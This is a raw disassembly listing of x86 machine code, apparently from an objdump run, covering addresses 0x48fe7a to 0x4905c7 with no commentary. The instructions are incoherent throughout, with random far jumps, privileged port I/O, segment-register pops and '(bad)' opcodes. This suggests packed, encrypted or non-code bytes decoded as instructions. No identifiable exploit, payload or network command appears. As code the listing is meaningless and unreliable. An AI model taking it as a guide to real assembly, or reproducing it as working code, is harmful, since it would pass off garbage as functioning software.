  48fe7a:	test   eax,0x31468f5a
  48fe7f:	push   ss
  48fe80:	sub    DWORD PTR [ecx+eiz*1-0x51],eax
  48fe84:	xchg   DWORD PTR [ebp+0x7915185],eax
  48fe8a:	inc    edi
  48fe8b:	jmp    0x48fe5d
  48fe8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48fe8e:	push   esi
  48fe8f:	out    dx,eax
  48fe90:	xlat   BYTE PTR ds:[ebx]
  48fe91:	adc    al,0x2e
  48fe93:	dec    edx
  48fe94:	sbb    bh,BYTE PTR [edi-0x56bd54cf]
  48fe9a:	adc    DWORD PTR [edi+0x6d560807],ecx
  48fea0:	or     DWORD PTR [edi+0x402ae9e7],esp
  48fea6:	test   BYTE PTR [edi],dh
  48fea8:	inc    ebx
  48fea9:	and    eax,DWORD PTR [eax+0x3217140c]
  48feaf:	adc    BYTE PTR [edx],bl
  48feb1:	push   esi
  48feb2:	ins    DWORD PTR es:[edi],dx
  48feb3:	xlat   BYTE PTR ds:[ebx]
  48feb4:	xchg   DWORD PTR [eax-0x485dd4f8],esi
  48feba:	ja     0x48ff11
  48febc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48febd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48febe:	aad    0x97
  48fec0:	lahf   
  48fec1:	mov    al,0x56
  48fec3:	or     DWORD PTR [ebp+0x58806657],0xd247f785
  48fecd:	adc    eax,0xf74fc146
  48fed2:	sub    al,al
  48fed4:	in     al,0xe0
  48fed6:	mov    edi,0xad681743
  48fedb:	cdq    
  48fedc:	(bad)  
  48fedd:	xlat   BYTE PTR ds:[ebx]
  48fede:	mov    al,ds:0x1738b422
  48fee3:	aaa    
  48fee4:	mov    cl,0x60
  48fee6:	xchg   esi,eax
  48fee7:	mov    ah,0xb7
  48fee9:	ror    DWORD PTR [edx+0x42],cl
  48feec:	fcomp  DWORD PTR [edi+0x7682b757]
  48fef2:	dec    edx
  48fef3:	pop    edx
  48fef4:	pop    edi
  48fef5:	or     esi,DWORD PTR [edx]
  48fef7:	fisub  WORD PTR [eax]
  48fef9:	scas   eax,DWORD PTR es:[edi]
  48fefa:	out    dx,eax
  48fefb:	sub    BYTE PTR [esi-0x58b05bfc],cl
  48ff01:	outs   dx,DWORD PTR ds:[esi]
  48ff02:	mov    eax,ds:0x5ea55a48
  48ff07:	iret   
  48ff08:	scas   eax,DWORD PTR es:[edi]
  48ff09:	push   esp
  48ff0a:	sub    DWORD PTR [eax],edx
  48ff0c:	pop    DWORD PTR [esi]
  48ff0e:	push   es
  48ff0f:	push   0x2f3592c5
  48ff14:	aaa    
  48ff15:	mov    BYTE PTR [ebx],dh
  48ff17:	aam    0x90
  48ff19:	ja     0x48ff51
  48ff1b:	cmp    BYTE PTR [eax+0x5f07b0e8],dh
  48ff21:	lods   eax,DWORD PTR ds:[esi]
  48ff22:	sbb    eax,0xb79b345a
  48ff27:	pop    eax
  48ff28:	add    eax,0x42de9a49
  48ff2d:	inc    edi
  48ff2e:	mov    cl,0x30
  48ff30:	or     cl,BYTE PTR [esi+0x42]
  48ff33:	inc    edi
  48ff34:	push   ebx
  48ff35:	mov    cl,0x6e
  48ff37:	or     DWORD PTR [eax],ebx
  48ff39:	mov    bh,0xb3
  48ff3b:	xor    cl,ch
  48ff3d:	push   cs
  48ff3e:	mov    bh,0x87
  48ff40:	inc    ecx
  48ff41:	and    DWORD PTR [edx+eiz*1+0x5f0760ac],0xffffffc4
  48ff49:	sub    ch,BYTE PTR [ebp+0x4b6f7f14]
  48ff4f:	sub    esi,DWORD PTR [esi]
  48ff51:	or     eax,DWORD PTR [edi]
  48ff53:	aaa    
  48ff54:	sbb    DWORD PTR ds:0xe3433634,0x8038d274
  48ff5e:	out    dx,eax
  48ff5f:	or     edx,ebx
  48ff61:	sub    BYTE PTR ds:0x2ad78721,al
  48ff67:	or     eax,0xa73f685d
  48ff6c:	ret    0xd620
  48ff6f:	adc    eax,0x468bae07
  48ff74:	mov    al,ds:0xe943af5f
  48ff79:	mov    ds:0x33f75091,al
  48ff7e:	mov    al,0x2
  48ff80:	or     BYTE PTR [ebx+0x1882f37],ch
  48ff86:	jmp    0x48ff0a
  48ff88:	inc    edi
  48ff89:	pop    es
  48ff8a:	imul   esi,DWORD PTR [eax-0x77],0xffffffc4
  48ff8e:	inc    edi
  48ff8f:	xchg   edi,eax
  48ff90:	mov    al,ds:0x9f2f60c5
  48ff95:	pop    esp
  48ff96:	add    eax,0x309756a0
  48ff9b:	and    DWORD PTR [ecx],edx
  48ff9d:	cmp    cl,BYTE PTR [ecx]
  48ff9f:	xchg   DWORD PTR [edi],ecx
  48ffa1:	sub    BYTE PTR [ebp+0x6d0fc281],ch
  48ffa7:	lods   eax,DWORD PTR ds:[esi]
  48ffa8:	call   0xef7fdec7
  48ffad:	pop    eax
  48ffae:	test   esi,edx
  48ffb0:	sub    bl,bh
  48ffb2:	pop    es
  48ffb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48ffb4:	inc    eax
  48ffb5:	pop    es
  48ffb6:	xor    al,0xda
  48ffb8:	daa    
  48ffb9:	add    al,dh
  48ffbb:	push   ss
  48ffbc:	mov    ch,0xa7
  48ffbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ffbf:	sub    eax,0x6f2909ac
  48ffc4:	outs   dx,DWORD PTR ds:[esi]
  48ffc5:	mov    al,ds:0x6f811c90
  48ffca:	xor    al,0x2d
  48ffcc:	imul   eax,DWORD PTR ds:0x2dff6f8b,0xffffffaa
  48ffd3:	fist   DWORD PTR [esi+0x6f]
  48ffd6:	pop    ss
  48ffd7:	shr    BYTE PTR [edi-0x3d8929ee],cl
  48ffdd:	push   edi
  48ffde:	fistp  WORD PTR [edi+0x2d]
  48ffe1:	lods   al,BYTE PTR ds:[esi]
  48ffe2:	popa   
  48ffe3:	sbb    eax,0x1c520f4f
  48ffe8:	cmp    BYTE PTR [eax],ch
  48ffea:	xchg   DWORD PTR [ecx+0x47],eax
  48ffed:	pop    esp
  48ffee:	jmp    0x490006
  48fff0:	adc    eax,0x7366b6f
  48fff5:	xor    al,0x4c
  48fff7:	xchg   ebp,eax
  48fff8:	mov    edx,0x304f930d
  48fffd:	jmp    0xcfcaad37
  490002:	inc    ebp
  490003:	stos   BYTE PTR es:[edi],al
  490004:	push   0xc7ef42ad
  490009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49000a:	add    al,0x52
  49000c:	sbb    DWORD PTR [ecx],esi
  49000e:	inc    ebx
  49000f:	adc    al,0xb
  490011:	pop    es
  490012:	aaa    
  490013:	lahf   
  490014:	aaa    
  490015:	pop    ebx
  490016:	pop    esp
  490017:	mov    BYTE PTR [edx],cl
  490019:	and    DWORD PTR [esi+0x120a360f],0x3b
  490020:	or     DWORD PTR [edi-0x7b6cfff9],eax
  490026:	or     DWORD PTR [ecx],esi
  490028:	xchg   DWORD PTR [ebx+0x7fb68158],ebx
  49002e:	addr16 mov ds:0x4059,eax
  490032:	test   al,0xf7
  490034:	out    0x28,eax
  490036:	mov    al,0xb4
  490038:	add    DWORD PTR [edi-0x7fc915b9],ebp
  49003e:	xlat   BYTE PTR ds:[ebx]
  49003f:	add    ah,BYTE PTR [edi]
  490041:	pop    eax
  490042:	repnz sbb BYTE PTR [esi+0x37],dl
  490046:	inc    ebx
  490047:	pop    esp
  490048:	sbb    BYTE PTR [ecx+0x42863f03],ch
  49004e:	dec    ecx
  49004f:	test   eax,0x200f9a42
  490054:	push   ebx
  490055:	rol    DWORD PTR [esi],cl
  490057:	iret   
  490058:	das    
  490059:	inc    esi
  49005a:	mov    bh,0xd6
  49005c:	jbe    0x4900be
  49005e:	dec    edi
  49005f:	mov    bh,0x27
  490061:	sbb    BYTE PTR ds:0x228f1232,dl
  490067:	popa   
  490068:	xor    al,0x43
  49006a:	scas   eax,DWORD PTR es:[edi]
  49006b:	daa    
  49006c:	loop   0x48fff8
  49006e:	push   esi
  49006f:	fisubr DWORD PTR [edi]
  490071:	pop    es
  490072:	and    al,0x82
  490074:	inc    ebp
  490075:	and    al,0xaf
  490077:	dec    edi
  490078:	mov    al,BYTE PTR [eax+0x2d]
  49007b:	cs jg  0x49001d
  49007e:	popa   
  49007f:	sub    ecx,DWORD PTR ds:0x9133438
  490085:	out    0x25,al
  490087:	inc    esi
  490088:	aas    
  490089:	das    
  49008a:	lods   al,BYTE PTR ss:[esi]
  49008c:	sbb    DWORD PTR [ebx+0x268f1f4a],esp
  490092:	pop    eax
  490093:	adc    DWORD PTR [edi+eiz*4],0x32
  490097:	fbstp  TBYTE PTR [esi]
  490099:	cmp    ch,BYTE PTR [eiz*1+0x5606f7f7]
  4900a0:	sub    al,0x69
  4900a2:	cmp    BYTE PTR [edi],al
  4900a4:	ficomp WORD PTR [edx+0xfdf4c52]
  4900aa:	test   DWORD PTR [ebx],0x3f34c518
  4900b0:	test   DWORD PTR [edi],ecx
  4900b2:	lods   eax,DWORD PTR ds:[esi]
  4900b3:	inc    edx
  4900b4:	dec    edi
  4900b5:	adc    eax,edx
  4900b7:	mov    dh,0xa8
  4900b9:	nop
  4900ba:	mov    DWORD PTR [edi-0x67cef7ba],0x929a2a57
  4900c4:	pop    edi
  4900c5:	cmovne eax,DWORD PTR ss:[esi+0x5a]
  4900ca:	dec    edx
  4900cb:	shr    DWORD PTR [edx-0x71],0xbf
  4900cf:	sbb    BYTE PTR ds:0x27ab16b6,al
  4900d5:	push   edx
  4900d6:	mov    ah,0x26
  4900d8:	add    BYTE PTR [edi-0x51],ch
  4900db:	dec    esp
  4900dc:	arpl   WORD PTR [ebx],ax
  4900de:	mov    esi,0x56d697bb
  4900e3:	and    DWORD PTR [ebp+0x1f],eax
  4900e6:	xchg   edi,eax
  4900e7:	inc    edi
  4900e8:	xchg   ebp,eax
  4900e9:	pop    eax
  4900ea:	add    al,0x24
  4900ec:	xchg   edi,eax
  4900ed:	xchg   esi,eax
  4900ee:	xor    BYTE PTR [ebp+ebp*2+0x61],al
  4900f2:	and    eax,0xd6031b2f
  4900f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4900f8:	jg     0x490129
  4900fa:	fisttp WORD PTR [ebx+0x53]
  4900fd:	add    al,0x61
  4900ff:	inc    edi
  490100:	inc    ecx
  490101:	bound  ecx,QWORD PTR [edx]
  490103:	retf   0x5f34
  490106:	cmp    edi,ebx
  490108:	mov    eax,DWORD PTR [ebp+esi*2-0x7a2890d3]
  49010f:	push   eax
  490110:	dec    eax
  490111:	adc    DWORD PTR [edi-0x6efa7628],esp
  490117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490118:	dec    edi
  490119:	xor    al,0x60
  49011b:	adc    al,bl
  49011d:	test   DWORD PTR [edi],0x690ab618
  490123:	mov    esi,DWORD PTR [edi]
  490125:	xor    eax,0x89156dae
  49012a:	xlat   BYTE PTR ds:[ebx]
  49012b:	xchg   DWORD PTR [edi],edi
  49012d:	rcr    DWORD PTR [edx],0x46
  490130:	mov    al,0x17
  490132:	jnp    0xc6ca8c53
  490138:	out    0x23,eax
  49013a:	sbb    BYTE PTR [eax-0x2370389a],dh
  490140:	mov    eax,0x31f71a22
  490145:	das    
  490146:	rcr    BYTE PTR [edx],0xe0
  490149:	push   edx
  49014a:	out    0x4f,eax
  49014c:	jne    0x49012b
  49014e:	pop    edx
  49014f:	xchg   ebp,eax
  490150:	scas   eax,DWORD PTR es:[di]
  490152:	xor    eax,0x84e81924
  490157:	dec    edi
  490158:	xor    BYTE PTR [ecx],dl
  49015a:	retf   
  49015b:	pop    eax
  49015c:	sub    BYTE PTR [edi],dl
  49015e:	aaa    
  49015f:	sbb    al,0x86
  490161:	push   edx
  490162:	jb     0x49019a
  490164:	outs   dx,DWORD PTR ds:[esi]
  490165:	pop    ebp
  490166:	xor    ecx,edx
  490168:	sbb    BYTE PTR [edi+0xab0a430],al
  49016e:	sub    eax,0x9406a22f
  490173:	jmp    0xd64b:0xa2d7d737
  49017a:	addr16 daa 
  49017c:	push   0x375a7833
  490181:	(bad)  
  490182:	mov    bh,0x91
  490184:	les    ebp,FWORD PTR [edx+0x6dd707b4]
  49018a:	jno    0x4901ec
  49018c:	push   ebp
  49018d:	(bad)  
  49018e:	aaa    
  49018f:	out    dx,eax
  490190:	sub    DWORD PTR [eax],esp
  490192:	shl    BYTE PTR [edi+ebx*2+0x183bc18c],1
  490199:	xlat   BYTE PTR ds:[ebx]
  49019a:	inc    ecx
  49019b:	lahf   
  49019c:	ret    0x4568
  49019f:	pop    eax
  4901a0:	mov    ds:0x8d843f5f,eax
  4901a5:	aam    0x4a
  4901a7:	maxps  xmm1,XMMWORD PTR [edx+0x12]
  4901ab:	push   esi
  4901ac:	mov    bl,0x97
  4901ae:	inc    esi
  4901af:	or     ah,BYTE PTR ds:0x389f8fac
  4901b5:	fimul  DWORD PTR [ebp+0x4fefab05]
  4901bb:	mov    ebx,0x87c87436
  4901c0:	inc    esi
  4901c1:	daa    
  4901c2:	xor    edi,edi
  4901c4:	sub    al,BYTE PTR [esi+0x321f6c30]
  4901ca:	pop    ds
  4901cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4901cc:	mov    al,0x10
  4901ce:	inc    edx
  4901cf:	out    0xc0,eax
  4901d1:	push   0x3237e8e1
  4901d6:	mov    bh,0x9b
  4901d8:	les    esp,FWORD PTR [ebx]
  4901da:	xor    dh,BYTE PTR [eax]
  4901dc:	mov    esi,0x110d1186
  4901e1:	fbstp  TBYTE PTR [edx]
  4901e3:	pop    ss
  4901e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4901e5:	mov    al,0xe0
  4901e7:	es xchg esp,eax
  4901e9:	cmpxchg BYTE PTR [edx-0x18],al
  4901ed:	mov    eax,ds:0x15c730cb
  4901f2:	inc    edx
  4901f3:	push   0xa1878794
  4901f8:	fiadd  DWORD PTR [esi+esi*4]
  4901fb:	pop    edi
  4901fc:	pop    ds
  4901fd:	aam    0xd5
  4901ff:	push   0x9300f09
  490204:	add    ebp,DWORD PTR [ecx-0x2a5fb8b6]
  49020a:	lods   al,BYTE PTR ds:[esi]
  49020b:	lds    ebx,FWORD PTR [edi-0x1b5efdb1]
  490211:	xchg   edi,eax
  490212:	mov    bh,0x46
  490214:	xor    cl,BYTE PTR [ebx+ebp*1+0x22]
  490218:	mov    edi,0x63d6422f
  49021d:	jno    0x490281
  49021f:	out    0x86,eax
  490221:	push   es
  490222:	or     ch,BYTE PTR [ebx+0x56af27d0]
  490228:	test   al,0x5d
  49022a:	and    DWORD PTR [edi-0x69],eax
  49022d:	es push ecx
  49022f:	mov    eax,0xef323f18
  490234:	je     0x490278
  490236:	push   0x21
  490238:	dec    edi
  490239:	sub    ecx,DWORD PTR es:[eax+ebp*8]
  49023d:	adc    al,0x67
  49023f:	push   esi
  490240:	lods   eax,DWORD PTR ss:[esi]
  490242:	cs pop ecx
  490244:	ja     0x490215
  490246:	lods   eax,DWORD PTR ds:[esi]
  490247:	popa   
  490248:	rcr    DWORD PTR [eax],0xdf
  49024b:	iret   
  49024c:	nop    DWORD PTR [edx]
  49024f:	inc    esi
  490250:	fs aas 
  490252:	mov    bh,0x44
  490254:	adc    eax,0xaf36b03b
  490259:	dec    edi
  49025a:	pop    edi
  49025b:	sbb    BYTE PTR ds:0x4df5893,dh
  490261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490262:	jne    0x4902a4
  490264:	lahf   
  490265:	das    
  490266:	dec    ebx
  490267:	mov    cl,0xd1
  490269:	push   esi
  49026a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49026b:	scas   eax,DWORD PTR es:[edi]
  49026c:	out    dx,eax
  49026d:	push   edi
  49026e:	leave  
  49026f:	add    eax,0xf757d11a
  490274:	xor    al,0x51
  490276:	push   0x31
  490278:	sub    BYTE PTR [edi],dl
  49027a:	lahf   
  49027b:	and    al,0x2c
  49027d:	es popa 
  49027f:	out    0x76,eax
  490281:	or     eax,0x5a0fa716
  490286:	daa    
  490287:	mov    dl,0xae
  490289:	mov    ah,BYTE PTR [edi+eax*8]
  49028c:	xor    DWORD PTR [esp+ebp*2+0xa],eax
  490290:	sub    ecx,DWORD PTR [edi]
  490292:	jg     0x490219
  490294:	test   DWORD PTR [eax+ecx*1+0x61253007],esi
  49029b:	aad    0x58
  49029d:	iret   
  49029e:	mov    bh,0x1d
  4902a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4902a1:	nop
  4902a2:	fwait
  4902a3:	aas    
  4902a4:	xor    eax,0x8ac4d0bb
  4902a9:	sub    DWORD PTR [edi-0x4b],edx
  4902ac:	jne    0x4902c9
  4902ae:	mov    edi,eax
  4902b0:	push   edi
  4902b1:	push   edi
  4902b2:	push   0xc782e40c
  4902b7:	xor    al,0xe0
  4902b9:	xchg   esp,eax
  4902ba:	test   BYTE PTR [ebp-0x9],al
  4902bd:	out    0x14,eax
  4902bf:	icebp  
  4902c0:	push   esi
  4902c1:	mov    cl,0x2f
  4902c3:	mov    ds:0x1c46ae92,eax
  4902c8:	daa    
  4902c9:	xor    edi,DWORD PTR [esi]
  4902cb:	mov    dh,0xb
  4902cd:	xchg   ebp,eax
  4902ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4902cf:	sbb    ah,bh
  4902d1:	dec    edi
  4902d2:	mov    ds:0x3fd62498,eax
  4902d7:	pop    edi
  4902d8:	les    edx,FWORD PTR [edi+eax*1]
  4902db:	test   DWORD PTR [ecx],esi
  4902dd:	(bad)  
  4902de:	cmp    eax,edi
  4902e0:	adc    BYTE PTR [edx+eiz*8-0x39],bl
  4902e4:	mov    ds:0xbb010bf,eax
  4902e9:	cli    
  4902ea:	pandn  mm0,QWORD PTR [ebx-0x8d5bb40]
  4902f1:	xchg   DWORD PTR [edx],eax
  4902f3:	popf   
  4902f4:	xchg   edx,eax
  4902f5:	push   ss
  4902f6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4902f8:	ror    DWORD PTR [edx-0x40c8edb8],1
  4902fe:	sub    bl,BYTE PTR [edx]
  490300:	imul   edx,DWORD PTR [ebx],0x30
  490303:	pop    ds
  490304:	pop    es
  490305:	inc    eax
  490306:	lods   eax,DWORD PTR ds:[esi]
  490307:	add    DWORD PTR [ecx],edi
  490309:	cmp    BYTE PTR [ebx],dh
  49030b:	aas    
  49030c:	mov    BYTE PTR [ebx],dl
  49030e:	shl    BYTE PTR [edx],cl
  490310:	xor    esp,DWORD PTR [edi]
  490312:	mov    al,ds:0x1f50dbb0
  490317:	push   ebp
  490318:	and    al,0x9
  49031a:	sub    edx,DWORD PTR [edi]
  49031c:	outs   dx,DWORD PTR ds:[esi]
  49031d:	ret    
  49031e:	pop    eax
  49031f:	test   DWORD PTR [ecx+0x622151b7],esp
  490325:	xor    eax,0x5602ef97
  49032a:	push   0x9ab02769
  49032f:	sub    al,0x2c
  490331:	lahf   
  490332:	scas   eax,DWORD PTR es:[edi]
  490333:	adc    al,0x3a
  490335:	inc    ebp
  490336:	loopne 0x490306
  490338:	fistp  WORD PTR [eax]
  49033a:	je     0x4903a7
  49033c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49033d:	pop    ds
  49033e:	pop    ss
  49033f:	push   cs
  490340:	mov    WORD PTR [edx],es
  490342:	cwde   
  490343:	push   edi
  490345:	push   0x78b0568
  49034a:	je     0x490360
  49034c:	and    al,ch
  49034e:	addr16 daa 
  490350:	xor    bl,cl
  490352:	shr    dl,0x26
  490355:	das    
  490356:	es nop
  490358:	and    BYTE PTR [edi+ebx*8+0x77],dh
  49035c:	test   DWORD PTR [edi-0x43],eax
  49035f:	lds    edx,FWORD PTR [edi+0x1f]
  490362:	mov    edi,0x56228088
  490367:	dec    DWORD PTR [edi]
  490369:	dec    ecx
  49036a:	lods   al,BYTE PTR ds:[esi]
  49036b:	rcl    DWORD PTR [esi-0x29],1
  49036e:	les    eax,FWORD PTR [ecx+0x2f173316]
  490374:	xor    DWORD PTR [eax-0x75],edx
  490377:	dec    ecx
  490378:	(bad)  
  490379:	jmp    DWORD PTR [esp+edi*2]
  49037c:	and    BYTE PTR [edi+ecx*2+0x34e0b1b3],dh
  490383:	je     0x490374
  490385:	addr16 adc eax,0xa7126ac5
  49038b:	iret   
  49038c:	inc    ebx
  49038d:	dec    eax
  49038e:	add    DWORD PTR [ebp-0x17baccc2],0xcf058914
  490398:	das    
  490399:	dec    eax
  49039a:	inc    edi
  49039b:	pop    eax
  49039c:	mov    al,0x67
  49039e:	mov    bh,0x9a
  4903a0:	mov    ch,BYTE PTR [ebp+0x43dfaf15]
  4903a6:	imul   ecx,DWORD PTR [eax+0x54],0xffffffc0
  4903aa:	aas    
  4903ab:	pop    edi
  4903ac:	mov    WORD PTR [edx+0x11],gs
  4903af:	pandn  mm6,mm7
  4903b2:	mov    al,ds:0x230fa146
  4903b7:	pop    ss
  4903b8:	aad    0x49
  4903ba:	or     ah,BYTE PTR [ebx+0x51759737]
  4903c0:	mov    ebx,0x5f7ef80
  4903c5:	add    al,0x8e
  4903c7:	pop    eax
  4903c8:	call   0x1658:0x35f1a2ff
  4903cf:	xchg   edi,eax
  4903d0:	ss out dx,al
  4903d2:	dec    ebx
  4903d3:	sub    edx,DWORD PTR [edi]
  4903d5:	out    0xe6,eax
  4903d7:	pop    eax
  4903d8:	shl    BYTE PTR [ecx+0x2d],cl
  4903db:	mov    edi,0x122c3936
  4903e0:	mov    DWORD PTR [ecx-0x19],ecx
  4903e3:	push   esi
  4903e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4903e5:	inc    esp
  4903e6:	repnz dec esi
  4903e8:	xor    BYTE PTR [edi],ch
  4903ea:	sub    eax,0x67030712
  4903ef:	xor    al,0xd5
  4903f1:	dec    esp
  4903f2:	sub    eax,edx
  4903f4:	das    
  4903f5:	fisttp WORD PTR [eax+ebp*2+0x1d]
  4903f9:	mov    edx,0x9501df4a
  4903fe:	mov    ebp,edx
  490400:	(bad)  
  490402:	xchg   edx,eax
  490403:	mov    ecx,DWORD PTR [ecx]
  490405:	or     BYTE PTR [edi+0x45],bh
  490408:	or     DWORD PTR [ecx],eax
  49040a:	sub    eax,DWORD PTR [edx+0x67]
  49040d:	adc    DWORD PTR [ecx],eax
  49040f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490410:	push   ebp
  490411:	outs   dx,DWORD PTR ds:[esi]
  490412:	mul    DWORD PTR [eax-0x409faa78]
  490418:	or     eax,0xa7ab70b0
  49041d:	cs aaa 
  49041f:	dec    edx
  490420:	cdq    
  490421:	clc    
  490422:	pop    edx
  490423:	cmp    eax,edi
  490425:	rcl    ch,1
  490427:	dec    eax
  490428:	lods   al,BYTE PTR ds:[esi]
  490429:	outs   dx,DWORD PTR ds:[esi]
  49042a:	cmp    ebp,eax
  49042c:	je     0x4903d7
  49042e:	or     bl,BYTE PTR [edi]
  490430:	sahf   
  490431:	ja     0x4903bd
  490433:	push   ecx
  490434:	jne    0x49044e
  490436:	push   ds
  490437:	ja     0x490450
  490439:	or     ch,BYTE PTR [ebx]
  49043b:	mov    dl,0xb0
  49043d:	inc    edi
  49043e:	push   ecx
  49043f:	and    esp,eax
  490441:	ins    DWORD PTR es:[edi],dx
  490442:	inc    edi
  490443:	ja     0x49041b
  490445:	mov    ah,0x62
  490447:	mov    ebx,0x9f7f2756
  49044c:	push   edx
  49044d:	mov    edx,0x46ef04e2
  490452:	test   eax,0xb7a11a75
  490457:	pop    es
  490458:	jno    0x49042d
  49045a:	pop    edx
  49045b:	and    DWORD PTR [edi-0x31],eax
  49045e:	sub    dl,bl
  490460:	add    al,0x5c
  490462:	ss jg  0x490497
  490465:	cmp    DWORD PTR [edx-0x78],ebx
  490468:	cwde   
  490469:	push   ss
  49046a:	out    0x87,eax
  49046c:	xchg   ebx,eax
  49046d:	dec    edi
  49046e:	sub    eax,esi
  490470:	xchg   edi,eax
  490471:	addr16 inc edx
  490473:	mov    eax,ds:0x7e5612d3
  490478:	pop    ds
  490479:	and    al,0x6
  49047b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49047c:	mov    DWORD PTR [edi],esi
  49047e:	pop    ss
  49047f:	in     al,dx
  490480:	pop    edx
  490481:	and    eax,0x7f323e1d
  490486:	das    
  490487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490488:	push   ebp
  490489:	dec    eax
  49048a:	mov    edi,0x3120398f
  49048f:	xor    eax,0x5838574a
  490494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490495:	pop    esi
  490496:	sub    bh,bh
  490498:	pop    ds
  490499:	outs   dx,DWORD PTR ds:[esi]
  49049a:	adc    DWORD PTR [eax-0x3c40a7d6],esi
  4904a0:	adc    al,0xb1
  4904a2:	dec    ebx
  4904a3:	rol    BYTE PTR [edi],0x51
  4904a6:	pop    ecx
  4904a7:	inc    eax
  4904a8:	push   0x3dea07c7
  4904ad:	push   ebx
  4904ae:	sbb    dl,BYTE PTR [edi-0x1]
  4904b1:	inc    ecx
  4904b2:	jo     0x4904e4
  4904b4:	jl     0x490441
  4904b6:	dec    edi
  4904b7:	inc    ebp
  4904b8:	pop    es
  4904b9:	stc    
  4904ba:	dec    ecx
  4904bb:	mov    ebp,0xf75fef8b
  4904c0:	inc    ecx
  4904c1:	fs stos BYTE PTR es:[edi],al
  4904c3:	fs sub al,0xf
  4904c6:	ss push edx
  4904c8:	sub    al,0x86
  4904ca:	xchg   edi,eax
  4904cb:	dec    edi
  4904cc:	neg    DWORD PTR [edi]
  4904ce:	lds    eax,FWORD PTR [edx]
  4904d0:	jo     0x4904c7
  4904d2:	outs   dx,DWORD PTR ds:[esi]
  4904d3:	fild   QWORD PTR [edi+0x58d72a4b]
  4904d9:	mov    dh,0x30
  4904db:	xor    al,0x2a
  4904dd:	test   BYTE PTR [edx],ch
  4904df:	dec    eax
  4904e0:	das    
  4904e1:	out    0xd2,eax
  4904e3:	cmp    al,BYTE PTR [ecx*1-0x77c6d321]
  4904ea:	adc    BYTE PTR [edi+0x34],cl
  4904ed:	adc    BYTE PTR [edx-0x6d],dl
  4904f0:	and    eax,0x18add6b7
  4904f5:	jmp    0x4904ce
  4904f7:	out    0x12,eax
  4904f9:	push   ecx
  4904fa:	push   0x17978f0a
  4904ff:	xor    DWORD PTR [ecx+0x4f27222f],esi
  490505:	xor    al,0x28
  490507:	arpl   ax,cx
  490509:	inc    ecx
  49050a:	xchg   edi,eax
  49050b:	xor    DWORD PTR [eax-0x2c],ecx
  49050e:	adc    BYTE PTR [ecx+0x37],0x67
  490512:	jge    0x490501
  490514:	jo     0x49049f
  490516:	pop    edi
  490517:	daa    
  490518:	outs   dx,DWORD PTR ds:[esi]
  490519:	jecxz  0x49052b
  49051b:	mov    ah,0x2d
  49051d:	dec    edx
  49051e:	scas   eax,DWORD PTR es:[edi]
  49051f:	mov    edi,0xa8614888
  490524:	ja     0x49056b
  490526:	outs   dx,DWORD PTR ds:[esi]
  490527:	push   ecx
  490528:	jl     0x490575
  49052a:	xor    DWORD PTR es:[edi+0x37],esp
  49052e:	xlat   BYTE PTR ds:[ebx]
  49052f:	inc    eax
  490530:	dec    eax
  490531:	adc    eax,0xb44742c4
  490536:	rcr    DWORD PTR [eax+0x54],cl
  490539:	(bad)  
  49053b:	or     ebp,DWORD PTR [ebx-0x46]
  49053e:	not    BYTE PTR [edi-0x1]
  490541:	inc    ebx
  490542:	xchg   edi,eax
  490543:	mov    ds:0x72058c2,eax
  490548:	pop    ds
  490549:	push   edx
  49054a:	test   BYTE PTR [edx],al
  49054c:	jno    0x4905b4
  49054e:	inc    edi
  49054f:	xor    eax,0x57209c5d
  490554:	cmp    BYTE PTR [edi],dl
  490556:	mov    edx,0xdfa94580
  49055b:	inc    edi
  49055c:	mov    edx,0x6fc40d84
  490561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490562:	mov    bh,0x3a
  490564:	test   cl,bl
  490566:	ja     0x49059f
  490568:	out    dx,eax
  490569:	ss jne 0x4905cd
  49056c:	ficom  DWORD PTR [edx+0x7f43c730]
  490572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490573:	outs   dx,DWORD PTR ds:[esi]
  490574:	ret    
  490575:	stos   BYTE PTR es:[edi],al
  490576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490577:	inc    edi
  490578:	mov    DWORD PTR [ecx+0x75],0x37bac298
  49057f:	out    0x18,eax
  490581:	sub    BYTE PTR [ebp+0x21],bh
  490584:	pop    ds
  490585:	out    0x43,eax
  490587:	xor    eax,0x1f67b13a
  49058c:	cmp    cl,ah
  49058e:	test   DWORD PTR [edx],ecx
  490590:	push   eax
  490591:	aaa    
  490592:	cmp    ecx,DWORD PTR [ebp-0x7c]
  490595:	mov    eax,0x42300724
  49059a:	pop    edx
  49059b:	cmc    
  49059c:	mov    edi,0x9b18d7af
  4905a1:	sub    BYTE PTR [ebp+0x41],cl
  4905a4:	mov    bl,0xa4
  4905a6:	push   edx
  4905a7:	xor    dl,BYTE PTR [esi-0x3d]
  4905aa:	xchg   ebx,eax
  4905ab:	retf   0xc960
  4905ae:	adc    BYTE PTR [edi+0x227a0b41],ah
  4905b4:	mov    al,0x5d
  4905b6:	lahf   
  4905b7:	aas    
  4905b8:	mul    DWORD PTR [edx+0x12]
  4905bb:	test   eax,0x345b9f1a
  4905c0:	mov    cl,BYTE PTR [ecx*1+0x20130597]
  4905c7:	mov    edi,0x1f393107
